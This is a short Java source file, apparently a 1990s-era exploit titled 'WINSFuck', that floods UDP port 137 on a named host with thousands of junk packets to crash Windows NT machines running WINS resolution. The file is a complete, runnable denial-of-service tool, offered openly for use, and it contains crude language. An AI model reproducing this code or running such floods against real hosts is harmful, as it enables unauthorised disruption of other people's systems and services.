/* WINSFuck.java by Wyzewun
 * Brings down pre-SP5 Windoze NT boxes with WINS Resolution enabled
 * I didn't discover the bug - this is just my code to exploit it
 * Probably not the best sploit for this, but definately the smallest
 */

import java.io.*;
import java.net.*;

public class WINSFuck {
  
public static void main(String[] args) throws IOException {
   
 if (args.length != 1) {
   System.out.println("Syntax: java WINSFuck <hostname>");
   System.exit(1); }
   
 DatagramSocket sock = new DatagramSocket();
 InetAddress addy = InetAddress.getByName(args[0]);
 byte[] die = (String.valueOf("Everyone here hides shades of shame").getBytes());
 DatagramPacket pckt = new DatagramPacket(die, die.length, addy, 137);
 for (int i = 0; i <= 12000; i++) sock.send(pckt); } }
